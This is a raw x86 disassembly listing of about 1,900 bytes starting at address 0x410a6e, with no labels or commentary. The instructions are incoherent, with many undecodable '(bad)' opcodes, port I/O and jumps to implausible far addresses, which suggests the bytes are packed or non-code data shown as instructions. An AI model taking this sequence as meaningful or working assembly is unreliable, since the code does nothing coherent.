  410a6e:	sbb    eax,0x4a34c409
  410a73:	leave  
  410a74:	xchg   BYTE PTR [eax],dl
  410a76:	ins    BYTE PTR es:[edi],dx
  410a77:	retf   0xb4a8
  410a7a:	test   eax,0xa4de5eb7
  410a7f:	mov    edx,0x115d746c
  410a84:	mov    ds:0xb3acac6d,al
  410a89:	stc    
  410a8a:	push   ecx
  410a8b:	aad    0x10
  410a8d:	push   edx
  410a8e:	xchg   esi,eax
  410a8f:	hlt    
  410a90:	inc    ebp
  410a91:	sub    dl,BYTE PTR [ecx*8+0x591966fa]
  410a98:	sbb    ecx,DWORD PTR [eax-0x4bbd3258]
  410a9e:	(bad)  
  410a9f:	aas    
  410aa0:	jnp    0x410aea
  410aa2:	repnz mov ch,0xcb
  410aa5:	or     ebx,DWORD PTR [edi-0x5d]
  410aa8:	jl     0x410b10
  410aaa:	push   edi
  410aab:	jl     0x410aa7
  410aad:	mov    ebp,0xe6a0e85f
  410ab2:	aaa    
  410ab3:	leave  
  410ab4:	mov    dh,0x14
  410ab6:	jnp    0x410b06
  410ab8:	sbb    eax,0x283b5c62
  410abd:	leave  
  410abe:	adc    eax,DWORD PTR [edi]
  410ac0:	adc    esp,ecx
  410ac2:	or     edx,DWORD PTR [edx-0x79]
  410ac5:	pop    esp
  410ac6:	or     al,0x80
  410ac8:	cmp    BYTE PTR [eax-0xe800c11],ah
  410ace:	ins    DWORD PTR es:[edi],dx
  410acf:	je     0x410ade
  410ad1:	je     0x410b0a
  410ad3:	test   DWORD PTR [eax+0x1d],eax
  410ad6:	sar    esi,1
  410ad8:	mov    al,0x40
  410ada:	add    eax,ebp
  410adc:	jl     0x410a9e
  410ade:	enter  0x95b1,0x3
  410ae2:	ret    
  410ae3:	imul   edx,DWORD PTR [eax-0x59a0660d],0xfffffff1
  410aea:	sar    BYTE PTR ss:[ecx+0x1a],1
  410aee:	jmp    0xb33014e5
  410af3:	push   cs
  410af4:	mov    BYTE PTR [esi-0x6c],dh
  410af7:	jle    0x410aab
  410af9:	jge    0x410ac3
  410afb:	ins    DWORD PTR es:[edi],dx
  410afc:	in     al,dx
  410afd:	mov    edx,0x9e5edc59
  410b02:	sbb    esi,ecx
  410b04:	xor    BYTE PTR [ebx-0x5cb0e78f],ah
  410b0a:	out    0x75,eax
  410b0c:	icebp  
  410b0d:	xor    ah,ch
  410b0f:	in     al,dx
  410b10:	cdq    
  410b11:	mov    ecx,0xfa83cc55
  410b16:	xor    BYTE PTR [edi-0x24],al
  410b19:	imul   eax,DWORD PTR [esi],0x96901609
  410b1f:	inc    ecx
  410b20:	and    cl,cl
  410b22:	xchg   ecx,eax
  410b23:	and    ch,al
  410b25:	inc    eax
  410b26:	jge    0x410abc
  410b28:	cld    
  410b29:	int    0x5d
  410b2b:	adc    bl,BYTE PTR [esi-0x23d5d181]
  410b31:	leave  
  410b32:	or     eax,0xd72287bd
  410b37:	jmp    0x45babe27
  410b3c:	mov    eax,0x9ad103d4
  410b41:	xlat   BYTE PTR ds:[ebx]
  410b42:	lea    edi,[ecx-0x25df5d93]
  410b48:	pop    DWORD PTR [esi+0x4af3666b]
  410b4e:	pop    ebp
  410b4f:	jg     0x410b3c
  410b51:	push   ss
  410b52:	push   esp
  410b53:	push   edx
  410b54:	xchg   ebx,eax
  410b55:	jge    0x410aed
  410b57:	repnz xor dl,bh
  410b5a:	and    edi,DWORD PTR cs:[esi-0x5e]
  410b5e:	ins    BYTE PTR es:[edi],dx
  410b5f:	push   ss
  410b60:	mov    ebp,0xeb1666ff
  410b65:	xchg   edx,eax
  410b66:	stos   DWORD PTR es:[edi],eax
  410b67:	jg     0x410b99
  410b69:	mov    ecx,ds
  410b6b:	fidivr WORD PTR [edx+0x46867693]
  410b71:	test   eax,0x6f381d
  410b76:	push   0x56ed56b1
  410b7b:	lock retf 
  410b7d:	inc    ecx
  410b7e:	(bad)  
  410b7f:	sbb    ebp,DWORD PTR [ebx-0x77]
  410b82:	xchg   esi,eax
  410b83:	out    dx,al
  410b84:	jg     0x410bfc
  410b86:	push   edx
  410b87:	cs int3 
  410b89:	fadd   QWORD PTR [esi-0x5841029d]
  410b8f:	dec    esp
  410b90:	les    ecx,FWORD PTR ds:0x32eb75de
  410b96:	mov    esp,0x53fcabb7
  410b9b:	in     al,0x40
  410b9d:	arpl   WORD PTR [edi-0x27edee59],ax
  410ba3:	icebp  
  410ba4:	fs mov bh,0x85
  410ba7:	jae    0x410bcf
  410ba9:	cwde   
  410baa:	loope  0x410b69
  410bac:	pop    ebp
  410bad:	call   0xaa042899
  410bb2:	bound  edx,QWORD PTR [eax+0x73]
  410bb5:	push   ebx
  410bb6:	mov    eax,0x69dd8e36
  410bbb:	cmp    dl,al
  410bbd:	iret   
  410bbe:	mov    al,0xf0
  410bc0:	aaa    
  410bc1:	adc    al,0xd5
  410bc3:	cmp    BYTE PTR [eax+ecx*4+0x74],ah
  410bc7:	push   eax
  410bc8:	shl    BYTE PTR [edx-0x3d],0xc0
  410bcc:	stc    
  410bcd:	pusha  
  410bce:	inc    edx
  410bcf:	mov    ebp,0x92a995ac
  410bd4:	and    BYTE PTR [ebp+0x62],bh
  410bd7:	push   es
  410bd8:	jge    0x410c23
  410bda:	xor    al,0xb9
  410bdc:	xchg   ebp,eax
  410bde:	add    eax,0x902f78d2
  410be3:	aas    
  410be4:	fiadd  WORD PTR [esp+eiz*8+0x11]
  410be8:	fstp   st(7)
  410bea:	jle    0x410b87
  410bec:	pop    esi
  410bed:	adc    esp,DWORD PTR [ebp+ecx*2-0x55e99b19]
  410bf4:	cmp    DWORD PTR [ecx],ebp
  410bf6:	xor    ch,BYTE PTR [ebx+0x5878aed0]
  410bfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bfd:	and    ah,BYTE PTR [ebx]
  410bff:	sbb    DWORD PTR [ebx],esp
  410c01:	pop    es
  410c02:	mov    edx,0x88af1c1e
  410c07:	mov    al,ds:0x56f8280c
  410c0c:	dec    edx
  410c0d:	xchg   ebx,eax
  410c0e:	add    edx,esp
  410c10:	pop    esp
  410c11:	outs   dx,WORD PTR ds:[esi]
  410c13:	sbb    eax,0xfef622aa
  410c18:	dec    ebx
  410c19:	sahf   
  410c1a:	test   ah,bl
  410c1c:	sti    
  410c1d:	push   0xa2b91257
  410c22:	xor    eax,0x7cc29821
  410c27:	jb     0x410c42
  410c29:	xor    BYTE PTR [ebx-0x7f],ch
  410c2c:	and    esi,DWORD PTR [esi]
  410c2e:	loop   0x410c26
  410c30:	ja     0x410be5
  410c32:	je     0x410c0b
  410c34:	(bad)  
  410c35:	shl    BYTE PTR [edx+0x22a3117],1
  410c3b:	mov    dh,0x22
  410c3d:	fld    QWORD PTR [ebx-0x58]
  410c40:	rcr    DWORD PTR [ecx*8-0x1535e078],cl
  410c47:	rol    BYTE PTR [ebx+0x589d5831],0xad
  410c4e:	sbb    edx,DWORD PTR [ebx+0x64]
  410c51:	fxch   st(2)
  410c53:	clc    
  410c54:	pop    ds
  410c55:	pop    esp
  410c56:	mov    eax,ds:0x35cce7c
  410c5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c5c:	cmp    ah,BYTE PTR [ebx+0x6b]
  410c5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c60:	loop   0x410bed
  410c62:	retf   
  410c63:	and    BYTE PTR [ebp+0x68],ch
  410c66:	pop    ecx
  410c67:	push   es
  410c68:	and    dh,BYTE PTR [edi]
  410c6a:	ins    BYTE PTR es:[edi],dx
  410c6b:	test   DWORD PTR [esp+edi*1],ebp
  410c6e:	(bad)  
  410c70:	mov    bh,0x70
  410c72:	stos   DWORD PTR es:[edi],eax
  410c73:	loop   0x410cc0
  410c75:	sub    dl,cl
  410c77:	or     al,BYTE PTR ss:[ebx+0xea68270]
  410c7e:	bound  edi,QWORD PTR [ebp+0x2d]
  410c81:	outs   dx,DWORD PTR ds:[esi]
  410c82:	sub    BYTE PTR [ecx],dh
  410c84:	xchg   DWORD PTR [esi-0x14],esp
  410c87:	sbb    esp,DWORD PTR [eax]
  410c89:	outs   dx,DWORD PTR ds:[esi]
  410c8a:	xchg   ecx,eax
  410c8b:	out    0x89,al
  410c8d:	das    
  410c8e:	jmp    0x410c60
  410c90:	cli    
  410c91:	inc    edx
  410c92:	out    0xc2,eax
  410c94:	stc    
  410c95:	sub    DWORD PTR [ebx+0x35],esi
  410c98:	mov    BYTE PTR [edx+edx*4],al
  410c9b:	jo     0x410cb1
  410c9d:	and    BYTE PTR [esp+edx*8-0x5931532b],bh
  410ca4:	out    0x5f,eax
  410ca6:	mov    cl,dl
  410ca8:	clc    
  410ca9:	push   ecx
  410caa:	jge    0x410c3a
  410cac:	mov    ah,0x12
  410cae:	stos   DWORD PTR es:[edi],eax
  410caf:	cwde   
  410cb0:	push   eax
  410cb1:	inc    ebp
  410cb2:	sub    bl,dl
  410cb4:	int3   
  410cb5:	jb     0x410d28
  410cb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cb8:	ror    ebp,1
  410cba:	push   es
  410cbb:	rcr    bh,cl
  410cbd:	ret    
  410cbe:	cmp    ecx,DWORD PTR ds:0x9f5247b2
  410cc4:	mov    bl,ah
  410cc6:	jg     0x410cac
  410cc8:	inc    esi
  410cc9:	test   DWORD PTR [ebx-0x4d87e2a4],eax
  410ccf:	pop    esi
  410cd0:	jmp    ecx
  410cd2:	push   esp
  410cd3:	push   esp
  410cd4:	gs xchg ecx,eax
  410cd6:	sbb    esp,edi
  410cd8:	pop    edi
  410cd9:	inc    edi
  410cda:	and    DWORD PTR [eax+0xc],ebx
  410cdd:	mov    dl,BYTE PTR [eax-0x60c84fab]
  410ce3:	js     0x410c86
  410ce5:	dec    eax
  410ce6:	pop    ebx
  410ce7:	xor    ebp,0xfffffff9
  410cea:	push   ss
  410ceb:	fs jae 0x410d5b
  410cee:	mov    eax,ds:0xe31b825e
  410cf3:	and    al,0x29
  410cf5:	inc    ebp
  410cf6:	test   eax,0xf18dca08
  410cfb:	cdq    
  410cfc:	out    dx,eax
  410cfd:	mov    ds:0xcc25f13c,al
  410d02:	jne    0x410d6b
  410d04:	mov    al,BYTE PTR [edx+ebx*2+0x6fb1141a]
  410d0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d0c:	jnp    0x410d2d
  410d0e:	xor    al,BYTE PTR [ebp-0x32925a31]
  410d14:	pop    es
  410d15:	out    0xc5,al
  410d17:	scas   al,BYTE PTR es:[edi]
  410d18:	fisubr WORD PTR [eax+0x57]
  410d1b:	test   esi,ebx
  410d1d:	fmul   DWORD PTR [edx+ecx*1-0x2643433e]
  410d24:	mov    ds:0x3961ed73,al
  410d29:	inc    edx
  410d2a:	or     eax,0x1fd09a79
  410d2f:	mov    ch,0x82
  410d31:	dec    esi
  410d32:	fisttp WORD PTR [ebx-0x73]
  410d35:	(bad)
  410d39:	pop    edi
  410d3a:	sete   ch
  410d3d:	cwde   
  410d3e:	jecxz  0x410d2f
  410d40:	call   0xf00fd9b9
  410d45:	xor    bh,BYTE PTR [ecx+0x32]
  410d48:	fadd   QWORD PTR [ecx+0x43d4e730]
  410d4e:	jo     0x410d55
  410d50:	mov    ecx,0xeeef6fae
  410d55:	or     dh,ah
  410d57:	mov    esp,0xce8476fb
  410d5c:	mov    cl,0xf6
  410d5e:	fsubr  QWORD PTR [esi+edi*4+0x59e9fe97]
  410d65:	sub    eax,0x66eaeb2
  410d6a:	stc    
  410d6b:	jge    0x410d2b
  410d6d:	icebp  
  410d6e:	xchg   DWORD PTR [ebx],esp
  410d70:	jmp    0xda71:0x1341deb8
  410d77:	xchg   edi,eax
  410d78:	push   esi
  410d79:	push   0xeaeff82a
  410d7e:	adc    BYTE PTR [esi+0x27],ch
  410d81:	(bad)  [edx+ebx*1+0x3c]
  410d85:	add    eax,0x9a2d4f29
  410d8a:	cmp    BYTE PTR [esi+0x3ce08f81],dh
  410d90:	push   ecx
  410d91:	sar    DWORD PTR [edx],0x16
  410d94:	out    dx,ax
  410d96:	scas   al,BYTE PTR es:[edi]
  410d97:	ret    
  410d98:	int    0xc1
  410d9a:	mov    esp,0x81a7b1ba
  410d9f:	lods   al,BYTE PTR ds:[esi]
  410da0:	mov    eax,ds:0xfdb801b0
  410da5:	and    ebx,DWORD PTR [ebx-0x3]
  410da8:	or     al,BYTE PTR [eax+0x47]
  410dab:	dec    ebp
  410dac:	je     0x410d60
  410dae:	retf   0x3ad9
  410db1:	clc    
  410db2:	stos   DWORD PTR es:[edi],eax
  410db3:	jge    0x410d91
  410db5:	xchg   esi,eax
  410db6:	addr16 sti 
  410db8:	shl    BYTE PTR [ecx],0xee
  410dbb:	inc    ecx
  410dbc:	out    0xcc,al
  410dbe:	scas   al,BYTE PTR es:[edi]
  410dbf:	push   es
  410dc0:	ins    DWORD PTR es:[edi],dx
  410dc1:	nop
  410dc2:	sub    cl,BYTE PTR ds:0x5a07874a
  410dc8:	(bad)  
  410dc9:	(bad)  
  410dca:	xchg   edx,eax
  410dcb:	aam    0x62
  410dcd:	sbb    al,ah
  410dcf:	or     edi,DWORD PTR [eax+0x6741a04e]
  410dd5:	adc    edi,ebp
  410dd7:	push   edi
  410dd8:	test   eax,0x6993c0a5
  410ddd:	xlat   BYTE PTR ds:[ebx]
  410dde:	lods   eax,DWORD PTR ds:[esi]
  410ddf:	mov    DWORD PTR [ebx-0x60],edx
  410de2:	fild   DWORD PTR [esp+edi*4+0x6a]
  410de6:	in     eax,0x25
  410de8:	jl     0x410e0d
  410dea:	aaa    
  410deb:	and    BYTE PTR [ecx+0x22b887c5],ah
  410df1:	and    ch,BYTE PTR ss:[esi]
  410df4:	jns    0x410d8d
  410df6:	(bad)  
  410df7:	pop    ss
  410df8:	fidivr DWORD PTR [edx+0x55944bff]
  410dfe:	or     eax,ebp
  410e00:	inc    edi
  410e01:	out    0xd2,eax
  410e03:	fisub  DWORD PTR [ecx]
  410e05:	popf   
  410e06:	xchg   ebp,eax
  410e07:	or     BYTE PTR [edx-0x338872ab],dl
  410e0d:	fcomp  QWORD PTR [ebx]
  410e0f:	cmp    BYTE PTR [edi+0x62],ch
  410e12:	push   esi
  410e13:	mov    ch,al
  410e15:	mov    DWORD PTR [ecx+0x60f0288c],edx
  410e1b:	addr16 popa 
  410e1d:	add    BYTE PTR gs:[ecx+0x507e18e5],dh
  410e24:	jbe    0x410e24
  410e26:	cwde   
  410e27:	sub    al,0xed
  410e29:	jb     0x410e41
  410e2b:	sti    
  410e2c:	inc    ecx
  410e2d:	cld    
  410e2e:	pushf  
  410e2f:	pop    ecx
  410e30:	push   edi
  410e31:	fist   DWORD PTR [ecx+0x5d]
  410e34:	sbb    DWORD PTR [ebx],ebx
  410e36:	sbb    ebx,DWORD PTR [esi-0xa]
  410e39:	pushf  
  410e3a:	in     al,0x87
  410e3c:	int3   
  410e3d:	ds jno 0x410e21
  410e40:	pusha  
  410e41:	es ins DWORD PTR es:[edi],dx
  410e43:	jne    0x410e34
  410e45:	clc    
  410e46:	ret    0xf7f9
  410e49:	sub    al,0xcd
  410e4b:	(bad)  
  410e4c:	cld    
  410e4d:	bound  esi,QWORD PTR [ebp+ebp*2-0x36]
  410e51:	ins    DWORD PTR es:[edi],dx
  410e52:	mov    esp,ds
  410e54:	mov    ebp,DWORD PTR [edx-0x7e]
  410e57:	pop    ss
  410e58:	xlat   BYTE PTR ds:[ebx]
  410e59:	loopne 0x410e38
  410e5b:	fdiv   st,st(1)
  410e5d:	inc    edi
  410e5e:	(bad)  
  410e5f:	stos   DWORD PTR es:[edi],eax
  410e60:	out    0xba,al
  410e62:	xchg   ecx,eax
  410e63:	sbb    esp,DWORD PTR [esi-0x24]
  410e66:	js     0x410ea7
  410e68:	xchg   BYTE PTR [eax],ah
  410e6a:	lods   eax,DWORD PTR ds:[esi]
  410e6b:	jae    0x410ee4
  410e6d:	daa    
  410e6e:	sub    ch,ch
  410e70:	(bad)  
  410e71:	or     eax,0xfa1e2b57
  410e76:	int    0x92
  410e78:	nop
  410e79:	sti    
  410e7a:	jg     0x410ea0
  410e7c:	(bad)  
  410e7d:	sbb    ah,BYTE PTR [esi]
  410e7f:	mov    cl,0x32
  410e81:	ficomp DWORD PTR [edx-0x6c]
  410e84:	mov    bl,0x4f
  410e86:	add    edi,ebx
  410e88:	call   0x6144:0x693f9c0c
  410e8f:	fsub   DWORD PTR [ebx-0x6787d938]
  410e95:	aad    0x99
  410e97:	dec    esp
  410e98:	cmc    
  410e99:	jnp    0x410e5b
  410e9b:	add    al,0xbe
  410e9d:	ja     0x410e8d
  410e9f:	out    dx,al
  410ea0:	push   edi
  410ea1:	repz cmp BYTE PTR [edx],bh
  410ea4:	leave  
  410ea5:	and    ecx,esi
  410ea7:	das    
  410ea8:	xor    edi,edi
  410eaa:	pop    ds
  410eab:	cwde   
  410eac:	jno    0x410e54
  410eae:	mov    bl,0x78
  410eb0:	bound  esi,QWORD PTR [edx-0x1eafe1cf]
  410eb6:	add    esp,DWORD PTR [edi+edi*2]
  410eb9:	dec    ebx
  410eba:	out    0xc5,al
  410ebc:	push   cs
  410ebd:	sub    bh,BYTE PTR [esi-0x49b41c10]
  410ec3:	xchg   ebx,eax
  410ec4:	out    dx,al
  410ec5:	les    ebx,FWORD PTR [edi]
  410ec7:	in     eax,0x29
  410ec9:	test   al,0x4d
  410ecb:	push   esp
  410ecc:	cmp    eax,0xc73d7b8b
  410ed1:	push   esi
  410ed2:	gs push eax
  410ed4:	out    0xd4,al
  410ed6:	sub    ch,BYTE PTR [edi]
  410ed8:	push   0xffffffa9
  410eda:	rcl    DWORD PTR [esi+0x5f8b049],1
  410ee0:	sbb    BYTE PTR [ebx+0x4d92da2f],al
  410ee6:	enter  0x9595,0x66
  410eea:	sti    
  410eeb:	adc    eax,0xde311ed8
  410ef0:	rol    edi,0xac
  410ef3:	inc    edx
  410ef4:	inc    eax
  410ef5:	mov    eax,0x32a9a5c6
  410efa:	sbb    al,0xf5
  410efc:	cmp    ecx,edi
  410efe:	loopne 0x410f09
  410f00:	rol    DWORD PTR [ebx+0x7cd152ea],cl
  410f06:	xor    al,0xb9
  410f08:	pusha  
  410f09:	mov    ds:0xe27d0566,al
  410f0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f0f:	mov    bl,0xc2
  410f11:	out    dx,eax
  410f12:	inc    esp
  410f13:	in     eax,dx
  410f14:	dec    esp
  410f15:	cdq    
  410f16:	scas   al,BYTE PTR es:[edi]
  410f17:	in     eax,0xde
  410f19:	push   ebp
  410f1a:	(bad)  
  410f1c:	call   0xec36:0xac30f633
  410f23:	lods   eax,DWORD PTR ds:[esi]
  410f24:	inc    esi
  410f25:	mov    ch,BYTE PTR [ebp-0x48]
  410f28:	xor    al,0x12
  410f2a:	inc    edx
  410f2b:	test   al,0x82
  410f2d:	cmp    edx,DWORD PTR [ecx]
  410f2f:	aaa    
  410f30:	addr16 jmp 0x76c6:0x1af937a3
  410f38:	lods   eax,DWORD PTR ds:[esi]
  410f39:	jg     0x410fb2
  410f3b:	sbb    eax,0x498ad0e9
  410f40:	sub    edi,DWORD PTR [esi]
  410f42:	sbb    al,0xf7
  410f44:	and    cl,BYTE PTR [esi-0x34]
  410f47:	ins    DWORD PTR es:[edi],dx
  410f48:	mov    ebx,0xbdc6aaa1
  410f4d:	or     ah,al
  410f4f:	in     al,0xbe
  410f51:	retf   0x65e6
  410f54:	test   al,0x3a
  410f56:	jno    0x410fad
  410f58:	add    BYTE PTR [ebx],0x16
  410f5b:	out    0xb5,eax
  410f5d:	jle    0x410f9b
  410f5f:	outs   dx,DWORD PTR ds:[esi]
  410f60:	inc    edx
  410f61:	mov    bh,0xaf
  410f63:	leave  
  410f64:	mov    cl,al
  410f66:	sub    al,0xde
  410f68:	jl     0x410fac
  410f6a:	jp     0x410ef8
  410f6c:	sub    eax,0xec8fe404
  410f71:	scas   eax,DWORD PTR es:[edi]
  410f72:	fwait
  410f73:	jb     0x410f1f
  410f75:	test   eax,0xd45c2439
  410f7a:	ins    BYTE PTR es:[edi],dx
  410f7b:	cmc    
  410f7c:	push   ss
  410f7d:	jge    0x410f97
  410f7f:	ds jb  0x410f51
  410f82:	mov    al,ds:0x513b449b
  410f87:	xchg   ebx,eax
  410f88:	xchg   ebx,eax
  410f89:	sbb    DWORD PTR [eax-0x5ee22e1a],ebp
  410f8f:	adc    BYTE PTR gs:[ecx+0x0],dl
  410f93:	cmp    bh,BYTE PTR [eax]
  410f95:	mov    dh,0x85
  410f97:	push   0x934414ae
  410f9c:	xchg   BYTE PTR [edi],dl
  410f9e:	cli    
  410f9f:	stos   DWORD PTR es:[edi],eax
  410fa0:	mov    bl,0x26
  410fa2:	popf   
  410fa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fa4:	data16 mov dl,0x3d
  410fa7:	hlt    
  410fa8:	sti    
  410fa9:	mov    ds:0x6e15feb1,eax
  410fae:	nop
  410faf:	sbb    BYTE PTR [eax],bh
  410fb1:	bound  edx,QWORD PTR [ebx+0xb799088]
  410fb7:	lea    esi,[ecx-0x3d86e369]
  410fbd:	pop    ds
  410fbe:	sti    
  410fbf:	mov    BYTE PTR [ebp+edi*8+0x26da462a],bh
  410fc6:	gs cmc 
  410fc8:	pop    eax
  410fc9:	shr    BYTE PTR [ebp+0xbbbfb40],cl
  410fcf:	cmp    esi,DWORD PTR [edx+ebx*1-0x60dca110]
  410fd6:	das    
  410fd7:	mov    esi,0x32acdca7
  410fdc:	dec    ecx
  410fdd:	pop    ds
  410fde:	fidivr DWORD PTR [ebx]
  410fe0:	pop    es
  410fe1:	scas   al,BYTE PTR es:[edi]
  410fe2:	out    dx,al
  410fe3:	loop   0x410fa0
  410fe5:	sub    dl,al
  410fe7:	mov    BYTE PTR [edi-0x50],0xfb
  410feb:	push   ebp
  410fec:	mov    dl,0x7e
  410fee:	les    esi,FWORD PTR [eax]
  410ff0:	pop    esp
  410ff1:	test   BYTE PTR [ebx+esi*2],ah
  410ff4:	xor    ebp,DWORD PTR [ebx]
  410ff6:	push   es
  410ff7:	into   
  410ff8:	jmp    0x410ff8
  410ffa:	stc    
  410ffb:	out    0xc0,eax
  410ffd:	add    bl,bl
  410fff:	(bad)  
  411000:	lods   eax,DWORD PTR ds:[esi]
  411001:	adc    eax,0x7b9a0d76
  411006:	mov    ds:0x8c3e616b,eax
  41100b:	jmp    0x41102f
  41100d:	(bad)  
  41100e:	push   eax
  41100f:	or     DWORD PTR [ecx+0x79],esi
  411012:	pusha  
  411013:	fdiv   QWORD PTR [edx+0x587e06ff]
  411019:	xor    eax,0x386b905d
  41101e:	(bad)  
  41101f:	js     0x411036
  411021:	scas   al,BYTE PTR es:[edi]
  411022:	pushf  
  411023:	outs   dx,BYTE PTR ds:[esi]
  411024:	mov    edx,DWORD PTR [esi]
  411026:	or     BYTE PTR es:[edi],bh
  411029:	addr16 and esp,ecx
  41102c:	call   DWORD PTR [esi+0x19]
  41102f:	outs   dx,BYTE PTR ds:[esi]
  411030:	stos   DWORD PTR es:[edi],eax
  411031:	xchg   ebx,eax
  411032:	fnsave [edx]
  411034:	add    ebp,ecx
  411036:	pop    ebx
  411037:	jle    0x411069
  411039:	or     cl,0x15
  41103c:	mov    WORD PTR [ebx-0x147d4166],?
  411042:	in     al,dx
  411043:	lods   al,BYTE PTR ds:[esi]
  411044:	lods   eax,DWORD PTR ds:[esi]
  411045:	jmp    0xd84f7d60
  41104a:	or     eax,0x7bd4a347
  41104f:	xor    al,0x44
  411051:	(bad)  
  411052:	jb     0x410ffb
  411054:	mov    edx,0xdf729719
  411059:	test   DWORD PTR [ebx],0x12f6e005
  41105f:	test   DWORD PTR [edx-0x51],ebx
  411062:	sub    BYTE PTR [edi+0x45],al
  411065:	je     0x4110b4
  411067:	scas   al,BYTE PTR es:[edi]
  411068:	pcmpeqb mm6,QWORD PTR [ecx+eiz*8]
  41106c:	popf   
  41106d:	lock xor al,0x3f
  411070:	add    DWORD PTR [ecx],esp
  411072:	test   esi,0x432868b8
  411078:	cdq    
  411079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41107a:	je     0x4110f2
  41107c:	xchg   ebp,eax
  41107d:	xchg   esi,eax
  41107e:	jb     0x411024
  411080:	cmp    eax,0x49b942a
  411085:	imul   ebp,DWORD PTR [ebx+0x3e7f799c],0x656710aa
  41108f:	aaa    
  411090:	and    ah,BYTE PTR ds:0xfbb3281e
  411096:	jp     0x4110b4
  411098:	or     dh,BYTE PTR [ebx+eiz*4+0x384f4494]
  41109f:	jo     0x41108b
  4110a1:	mov    WORD PTR [ecx-0x43ae687a],gs
  4110a7:	std    
  4110a8:	shl    BYTE PTR [ebp-0x2b],1
  4110ab:	add    bl,BYTE PTR [ecx+0x7bdc2cc7]
  4110b1:	mov    dl,0x63
  4110b3:	call   0x3874:0xf70c7822
  4110ba:	mov    ch,0x4e
  4110bc:	xor    eax,ecx
  4110be:	popa   
  4110bf:	mov    bh,0xdc
  4110c1:	jne    0x41108e
  4110c3:	xchg   edi,eax
  4110c4:	xor    edx,DWORD PTR [ecx]
  4110c6:	inc    eax
  4110c7:	sbb    bl,0x29
  4110ca:	pushf  
  4110cb:	fisttp QWORD PTR [esi-0x629b3610]
  4110d1:	adc    eax,0x5eebe9ab
  4110d6:	int3   
  4110d7:	pop    esp
  4110d8:	dec    edi
  4110d9:	add    eax,DWORD PTR [ebx+0x45]
  4110dc:	push   esi
  4110dd:	jno    0x4110c9
  4110df:	push   edx
  4110e0:	out    dx,al
  4110e1:	xor    DWORD PTR [edi+0x28],0x50
  4110e5:	or     ch,bl
  4110e7:	stos   BYTE PTR es:[edi],al
  4110e8:	or     edx,ebp
  4110ea:	mov    ?,WORD PTR [ecx]
  4110ec:	repz pop edx
  4110ee:	sbb    DWORD PTR [esi-0x3d],esi
  4110f1:	aas    
  4110f2:	xchg   esi,eax
  4110f3:	aaa    
  4110f4:	xor    al,0xd3
  4110f6:	neg    bh
  4110f8:	mov    cl,0xdb
  4110fa:	in     al,0x95
  4110fc:	add    eax,0xa74ff9ac
  411101:	mov    ch,0x7d
  411103:	gs je  0x411177
  411106:	pop    ecx
  411107:	mov    bl,0x98
  411109:	dec    eax
  41110a:	out    dx,eax
  41110b:	bound  edx,QWORD PTR [edi+0x5a]
  41110e:	lds    ebp,FWORD PTR ss:[edi-0x608f6881]
  411115:	loopne 0x411131
  411117:	cmp    ebx,DWORD PTR [eax+0x68]
  41111a:	pop    edi
  41111b:	mov    ecx,0x1b1a51ee
  411120:	adc    eax,0x4a6b69ee
  411125:	mov    eax,0xc6602367
  41112a:	dec    ebx
  41112b:	mov    ah,0xb5
  41112d:	cmp    BYTE PTR [edx+0x22],cl
  411130:	ficom  DWORD PTR [edi+esi*1-0x73]
  411134:	push   ecx
  411135:	test   al,0x8c
  411137:	dec    ebx
  411138:	retf   0x85ff
  41113b:	pop    ebp
  41113c:	dec    esp
  41113d:	sub    BYTE PTR ds:0x60568a9a,dl
  411143:	inc    eax
  411144:	or     DWORD PTR [edx-0x7],ecx
  411147:	hlt    
  411148:	jmp    0x4111a5
  41114a:	push   edi
  41114b:	push   ebp
  41114c:	pop    esp
  41114d:	push   esi
  41114e:	int3   
  41114f:	scas   eax,DWORD PTR es:[edi]
  411150:	mov    dh,0xc1
  411152:	int3   
  411153:	ja     0x41118f
  411155:	xchg   cl,dl
  411157:	push   0x50f6653e
  41115c:	lods   eax,DWORD PTR ds:[esi]
  41115d:	std    
  41115e:	xchg   esi,eax
  41115f:	scas   al,BYTE PTR es:[edi]
  411160:	jge    0x4111c1
  411162:	or     DWORD PTR [edi],esp
  411164:	dec    eax
  411165:	cmp    ah,bl
  411167:	jl     0x411100
  411169:	or     eax,DWORD PTR [ebx+0x188100b9]
  41116f:	cwde   
  411170:	sahf   
  411171:	jne    0x41117c
  411173:	leave  
  411174:	jo     0x41115e
  411176:	sub    BYTE PTR [edx],0x8
  411179:	jb     0x41118e
  41117b:	xchg   ebp,eax
  41117c:	mov    eax,ds:0xc584b317
  411181:	add    eax,0xf46195a1
  411186:	pusha  
  411187:	mov    eax,0xba7f0b53
  41118c:	push   ds
  41118d:	outs   dx,DWORD PTR ds:[esi]
  41118e:	test   DWORD PTR [eax+0x1ee4387f],0xa12e0d1b
  411198:	test   DWORD PTR [ebx+0x21192162],esi
  41119e:	add    cl,BYTE PTR [ecx]
  4111a0:	sub    ch,dh
  4111a2:	or     BYTE PTR ds:0x30c62413,cl
  4111a8:	xor    dl,dl
  4111aa:	pop    ebp
  4111ab:	adc    ch,cl
  4111ad:	adc    BYTE PTR [ecx+eiz*2],bh
  4111b0:	mov    edi,0xfc9c7ea7
  4111b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111b6:	sbb    al,0x57
  4111b8:	mov    edx,0x152a2c71
  4111bd:	pushf  
  4111be:	lea    edi,[esi]
  4111c0:	xlat   BYTE PTR ds:[ebx]
  4111c1:	push   edi
  4111c2:	call   0xff9d7f22
  4111c7:	adc    eax,0xe47860ae
  4111cc:	popa   
  4111cd:	xchg   edx,eax
  4111ce:	xor    bl,dl
  4111d0:	mov    al,ds:0xcb8e581a
  4111d5:	push   eax
  4111d6:	adc    ah,dl
  4111d8:	clc    
  4111d9:	push   ss
  4111da:	cmp    eax,0xdf24101c
  4111df:	scas   al,BYTE PTR es:[edi]
  4111e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111e1:	retf   0xae36
  4111e4:	or     DWORD PTR [edi-0x73da39ea],esp
  4111ea:	jb     0x4111ba
  4111ec:	mov    eax,ds:0xd8ffe012
  4111f1:	mov    dh,BYTE PTR [ebx+0x78ec370d]
